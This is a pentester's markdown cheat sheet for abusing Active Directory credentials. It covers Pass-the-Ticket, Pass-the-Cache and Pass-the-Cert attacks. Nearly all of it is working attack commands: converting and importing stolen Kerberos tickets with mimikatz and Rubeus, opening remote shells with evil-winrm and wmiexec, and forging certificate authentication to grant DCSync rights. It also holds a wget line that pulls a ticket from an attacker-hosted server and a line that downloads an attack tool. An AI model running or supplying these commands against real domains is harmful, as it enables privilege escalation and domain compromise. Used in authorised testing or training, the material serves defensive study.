# Cred usage
## Pass-the-Ticket / Pass-the-Cache
### convert ccache to kirbi
```bash
# convert ticket to kirbi for Rubeus or mimikatz
impacket-ticketConverter Administrator.ccache Administrator.kirbi

# then download the ticket on windows
wget -outfile Administrator.kirbi -uri http://192.168.68.10:9595/Administrator.kirbi -usebasicparsing

# ensure all low-priv tickets are removed 
klist purge

# then import the ticket on windows
# use either this
mimikatz "kerberos::ptt Administrator.kirbi" exit
# or this
Rubeus.exe ptt /ticket:Administrator.kirbi

# ensure it's imported
klist
```

### e.g.
```bash
### WinRM
# make sure /etc/krb5.conf has the contoso.org domain specified
# make sure -i includes fqdn and that it is resolvable
# make sure the SPN is HTTP/...
export KRB5CCNAME=Administrator.ccache && evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org

# if spn is WSMAN or HOST or any other - specify it in --spn parameter
evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org --spn WSMAN


### WMI
export KRB5CCNAME=Administrator.ccache && klist && impacket-wmiexec -debug -k -no-pass contoso.org/Administrator@WIN-KML6TP4LOOL
```

## Pass-the-Cert
```bash
### PKINIT is enabled
# use a pfx file with certipy-ad
certipy-ad auth -pfx ./WIN-KML6TP4LOOL\$.pfx -dc-ip 192.168.68.64 -domain contoso.org


### PKINIT is disabled
# if you get the following error that means DC's KDC certificate doesn't support PKINIT (because DC's certificate doesn't have "KDC Authentication" EKU)
# KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
# in order to resolve it do the following:
# the pfx format contains a private key and the cert. extract them.
certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
# download and use "passthecert" utility
wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py
# even when PKINIT is not supported, we can still authenticate on a DC using mTLS - this is what PassTheCert.py does. Unfortunately, if an account you coerced and got the cert to doesn't have necessary LDAP outbound rights (e.g. it's a domain controller computer account which cannot do anything, apart from RPC DCSync - you cannot do anything with it)

# If you get something similar to "User not found in LDAP" that probably means the DC you have the cert for is not domain-joined
# now you can grant yourself DCSync privs, modify user's password or change DC's msDS-AllowedToActOnBehalfOfOtherIdentity for RBAC
# This (modify_user + -elevate) will grant the user account DCSync privileges
python3 ./passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target kelly.hill -elevate -domain push.vl -dc-host dc01.push.vl
```
